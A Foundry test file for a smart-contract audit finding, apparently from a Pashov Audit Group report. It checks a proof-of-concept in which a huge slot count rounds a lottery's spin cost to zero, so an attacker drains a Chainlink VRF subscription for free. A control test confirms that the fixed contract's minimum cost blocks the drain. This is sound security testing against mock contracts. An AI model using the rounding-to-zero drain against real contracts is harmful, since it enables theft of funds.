// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    SpinLottery,
    SpinLotteryFixed,
    MockVRFCoordinator,
    MiniUSDC,
    MiniLINK
} from "./62538-h-01-funds-in-subscription-may-be-drained-pashov-audit-group.sol";

contract FundsInSubscriptionMayBeDrainedTest is Test {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    function test_exploit_freeSpinsDrainVrfSubscription() public {
        Exploit e = new Exploit();
        e.run();

        // The attacker-controlled huge _totalSlots rounds the spin cost to 0.
        assertEq(e.spinCostPerSpin(), 0, "spin cost rounds to zero");

        // Attacker pays nothing across all spins.
        assertEq(e.attackerUsdcSpent(), 0, "attacker spent no USDC");

        // The 10-LINK subscription is fully drained by the free spins.
        assertEq(e.subscriptionBefore(), 10e18, "subscription funded with 10 LINK");
        assertEq(e.subscriptionAfter(), 0, "subscription fully drained to zero");

        // The drained fees end up at the Chainlink coordinator SINK.
        assertEq(e.sinkLinkDrained(), 10e18, "10 LINK drained to Chainlink sink");
        MiniLINK link = MiniLINK(e.linkAddr());
        assertEq(link.balanceOf(SINK), 10e18, "drained LINK sits at SINK");

        // Real accounting: the vulnerable contract collected 0 USDC from the drain.
        MiniUSDC usdc = MiniUSDC(e.usdcAddr());
        assertEq(usdc.balanceOf(e.lotteryAddr()), 0, "lottery collected no USDC for the free spins");
    }

    function test_control_minSpinCostBlocksFreeDrain() public {
        // Rebuild the identical scenario against the FIXED contract (minimum cost).
        MiniUSDC usdc = new MiniUSDC();
        MiniLINK link = new MiniLINK();
        MockVRFCoordinator coord = new MockVRFCoordinator(address(link), 1e18);
        SpinLotteryFixed lottery = new SpinLotteryFixed(address(usdc), address(coord), 10e6);

        link.mint(address(coord), 10e18);
        coord.fundSubscription(10e18);

        usdc.mint(address(this), 1000e6);
        usdc.approve(address(lottery), type(uint256).max);

        // The same huge-slots call is NOT free under the fix.
        uint256 fixedCost = lottery.calculateSpinCost(1e12, 1);
        assertGt(fixedCost, 0, "fix enforces a positive minimum spin cost");

        uint256 balBefore = usdc.balanceOf(address(this));
        lottery.spin(1e12, 1);
        uint256 spent = balBefore - usdc.balanceOf(address(this));

        // Each spin now costs real USDC, so the free VRF drain is blocked.
        assertEq(spent, fixedCost, "attacker pays the minimum cost per spin");
        assertGt(spent, 0, "free drain is blocked - each spin costs real USDC");
    }
}
